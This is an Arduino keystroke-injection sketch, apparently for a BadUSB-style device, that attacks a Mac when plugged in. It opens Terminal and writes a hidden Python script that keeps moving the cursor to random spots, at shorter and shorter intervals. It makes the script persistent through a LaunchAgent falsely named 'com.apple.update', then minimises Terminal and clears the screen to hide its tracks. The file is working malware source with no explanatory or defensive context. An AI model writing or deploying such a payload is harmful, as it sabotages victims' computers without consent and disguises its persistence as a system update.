#include <Keyboard.h>

void t(const char* s) { for(int i=0;s[i];i++){Keyboard.write(s[i]);delay(5);} }
void ln(const char* s) { t(s); Keyboard.write(KEY_RETURN); delay(30); }

void setup() {
  delay(2500); Keyboard.begin(); delay(500);
  Keyboard.press(KEY_LEFT_GUI); Keyboard.press(' ');
  delay(100); Keyboard.releaseAll(); delay(1200);
  t("Terminal"); delay(500);
  Keyboard.write(KEY_RETURN); delay(4000);

  ln("cat>~/.j.py<<'E'");
  delay(300);
  ln("from Quartz import CGWarpMouseCursorPosition");
  ln("import time,random");
  ln("i=600");
  ln("while 1:");
  ln(" time.sleep(i)");
  ln(" if i>120:i-=60");
  ln(" CGWarpMouseCursorPosition((random.randint(0,2560),random.randint(0,1600)))");
  ln("E");
  delay(300);

  ln("mkdir -p ~/Library/LaunchAgents");
  ln("cat>~/Library/LaunchAgents/com.apple.update.plist<<E");
  ln("<?xml version=\"1.0\" encoding=\"UTF-8\"?>");
  ln("<plist version=\"1.0\"><dict><key>Label</key><string>com.apple.update</string><key>ProgramArguments</key><array><string>/usr/bin/python3</string><string>$HOME/.j.py</string></array><key>RunAtLoad</key><true/><key>KeepAlive</key><true/></dict></plist>");
  ln("E");
  delay(300);

  ln("python3 -m pip install pyobjc-framework-Quartz -q;launchctl load ~/Library/LaunchAgents/com.apple.update.plist;osascript -e 'tell app \"Terminal\" to set miniaturized of every window to true'");
  delay(500);
  ln("clear");
  Keyboard.end();
}
void loop() {}
